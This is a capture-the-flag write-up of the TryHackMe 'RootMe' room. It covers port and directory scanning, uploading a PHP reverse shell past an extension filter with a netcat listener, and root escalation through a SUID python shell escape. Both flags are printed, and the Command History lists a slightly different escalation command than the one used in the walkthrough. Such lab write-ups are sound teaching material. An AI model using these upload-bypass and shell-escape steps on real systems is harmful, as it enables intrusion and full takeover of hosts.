# Room Information

Room link: https://tryhackme.com/room/rrootme

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/27/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.53.28 > PortScan.txt
```
```bash                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 14:23 EDT
Nmap scan report for 10.10.53.28
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.59 seconds
```

# 
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.53.28 -r > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 25 14:25:44 2023
URL_BASE: http://10.10.53.28/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.53.28/ ----
==> DIRECTORY: http://10.10.53.28/css/                                                       
+ http://10.10.53.28/index.php (CODE:200|SIZE:616)                                            
==> DIRECTORY: http://10.10.53.28/js/                                                          
==> DIRECTORY: http://10.10.53.28/panel/                                                      
+ http://10.10.53.28/server-status (CODE:403|SIZE:276)                                        
==> DIRECTORY: http://10.10.53.28/uploads/   
                                                                               
-----------------
END_TIME: Sun Jun 25 15:10:38 2023
DOWNLOADED: 9224 - FOUND: 3
```

# Vulnerability Identification
> Arbitrary File Upload
6. `firefox http://{TARGET IP}/panel` to launch our Mozilla Firefox web browser and direct it to the specified URL
```bash
┌──(kali㉿kali)-[~]
└─$ firefox http://10.10.53.28/panel
```

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Panel%20Directory.png)

# Vulnerability Exploitation
> Reverse Shell
7. `git clone https://github.com/pentestmonkey/php-reverse-shell` to clone the specified Github repository onto our local machine, that we'll attempt to upload onto and execute on the target machine to create a reverse shell
```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/pentestmonkey/php-reverse-shell
Cloning into 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Receiving objects: 100% (10/10), 9.81 KiB | 837.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
```
8. `cd php-reverse-shell` to switch into our newly cloned php-reverse-shell repository  
9. `ls` to list all the files that are in our current repository, 
10. `sudo gedit php-reverse-shell.php` to open up GNOME Editor (gedit) to upen up the php-reverse-shell.php
```bash
┌──(kali㉿kali)-[~]
└─$ cd php-reverse-shell   
```
```bash
┌──(kali㉿kali)-[~/php-reverse-shell]
└─$ ls
CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
```
```bash
┌──(kali㉿kali)-[~/php-reverse-shell]
└─$ sudo gedit php-reverse-shell.php 
```
11. We'll change the value in the $ip variable to our attacking machine's IP address and the value of the $port variable to the port that we'll use for the Netcat listener that we'll set up to listen for any incoming connection

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Setting%20Up%20PHP%20Reverse%20Shell.png)
13. `CTRL + S` to the save the changes we've made to the php-reverse-shell.php file
14. `nc -lvnp {PORT NUMBER}` to open up a Netcat listener on the specified port
```bash
┌──(kali㉿kali)-[~/php-reverse-shell]
└─$ nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
14. Attempting to upload the PHP file displays an "Error sending the file!" message

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/PHP%20Not%20Permitted.png)
16. Since this is a PHP reverse shell, we can create copies of this PHP reverse shell with these different PHP extensions: **.phps**, **.phtml**, **.php3**, **.php4**, and **.php5**

`cp php-reverse-shell.php php-reverse-shell.phtml`

`cp php-reverse-shell.php php-reverse-shell.php3`

`cp php-reverse-shell.php php-reverse-shell.php4`

`cp php-reverse-shell.php php-reverse-shell.php5`

`cp php-reverse-shell.php php-reverse-shell.phps`

16. `firefox http://{TARGET IP}/uploads` to see the files that we managed to successfully upload onto the target system
  
![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Uploads%20Directory.png)
18. Although we managed to successfully upload four out of the five different PHP versions, only two of them (**.phtml** and **.php5**) are able to be executed and connect back to our Netcat listener without any problem
19. `whoami` to see who we managed to connect to the server as
```bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.53.28 50572 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:48:56 up  1:38,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
19. `find / -type f -name user.txt 2>/dev/null` to search for the **user.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
20. `cat {USER.TXT FILE PATH}` to display contents of the user.txt file on the terminal
```bash
$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
```
```bash
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

# Post Exploitation
> Privilege Escalation
21. `sudo -l` to list the sudo privileges assigned to the user, but doesn't work in this case since we don't have access to an interactive terminal
22. `python -c ‘import pty; pty.spawn(“/bin/bash”)’` to spawn an interactive bash shell with pseudo-terminal support
23. `sudo -l` to attempt a second time to list the sudo privileges assigned to the user, which this time prompts us for the current user's password, for which we don't have
24. `find / -perm -u=s -type f 2>/dev/null` to search the entire filesystem (**"/"**) for regular files (**-type f**) with a setuid permission (**-perm -u=s**) for the current user that we're logged in as
```bash
$ sudo -l
sudo: no tty present and no askpass program specified
```
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ 
```
```bash
bash-4.4$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
```
```bash
bash-4.4$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```
25. `firefox https://gtfobins.github.io/gtfobins/python/` to launch our Mozilla Firefox web browser and direct it to the specified URL, and then search for Python payloads that would allow us to elevate our current privileges
26. `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’` to execute a Bourne shell (sh) with elevated privileges as sudo using the Python interpreter
27. `whoami` to check if we're now successfully connected as root
```bash
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
#
```
```bash
# whoami
whoami
root
```
28. `find / -type f -name root.txt 2>/dev/null` to search for the **root.txt** file in the entire file system ("/") and display the path of any matching files while suppressing any error messages that may occur during the search
29. `cat {ROOT.TXT FILE PATH}` to display contents of the root.txt file on the terminal
```bash
# find / -type f -name root.txt 2>/dev/null
find / -type f -name root.txt 2>/dev/null
/root/root.txt
```
```bash
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```


**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20RootMe.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP} > {FILENAME2}.txt`
4. `cat {FILENAME2}.txt`
5. `firefox http://{TARGET IP}/panel`
6. `git clone https://github.com/pentestmonkey/php-reverse-shell`
7. `cd php-reverse-shell`
8. `ls`
9. `sudo gedit php-reverse-shell.php`
10. `nc -lvnp {PORT NUMBER}`
11. `cp php-reverse-shell.php php-reverse-shell.phtml`
12. `cp php-reverse-shell.php php-reverse-shell.php3`
13. `cp php-reverse-shell.php php-reverse-shell.php4`
14. `cp php-reverse-shell.php php-reverse-shell.php5`
15. `cp php-reverse-shell.php php-reverse-shell.phps`
16. `firefox http://{TARGET IP}/uploads`
17. `whoami`
18. `find / -type f -name user.txt 2>/dev/null`
19. `cat {USER.TXT FILE PATH}`
20. `sudo -l`
21. `python -c ‘import pty; pty.spawn(“/bin/bash”)’`
22. `sudo -l`
23. `find / -perm -u=s -type f 2>/dev/null`
24. `firefox https://gtfobins.github.io/gtfobins/python/`
25. `sudo python -c 'import os; os.system("/bin/sh")'`
26. `whoami`
27. `find / -type f -name root.txt 2>/dev/null`
28. `cat {ROOT.TXT FILE PATH}`

# Dissecting the Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file


`find / -type f -name user.txt 2>/dev/null`
+ `/` specifies the starting directory to be the root directory
+ `-type f` specifies that it should only search for regular files
+ `-name user.txt` specifies to search for a file called user.txt
+ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal


`python -c ‘import pty; pty.spawn(“/bin/bash”)’`
+ `-c` executes a command or script passed as a string
+ `import pty` imports the **pty** module, which provides functionality for controlling a pseudo-terminal, which is a software-based terminal emulation that allows programs to interact with the terminal as if they were running on a physical terminal device
+ `pty.spawn("/bin/bash")` is a function from the pty module that's used to spawn a new shell process, which in this case we're spawning a Bash shell 


`sudo python -c 'import os; os.system("/bin/sh")'`
+ `-c` executes a command or script passed as a string
+ `import os` imports the **os** mudile, which provides a way to interact with the OS
+ `os.system("/bin/sh")` executes the specified shell command to spawn a Bourne shell (sh)


`find / -type f -name root.txt 2>/dev/null`
+ `/` specifies the starting directory to be the root directory
+ `-type f` specifies that it should only search for regular files
+ `-name root.txt` specifies to search for a file called root.txt
+ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/

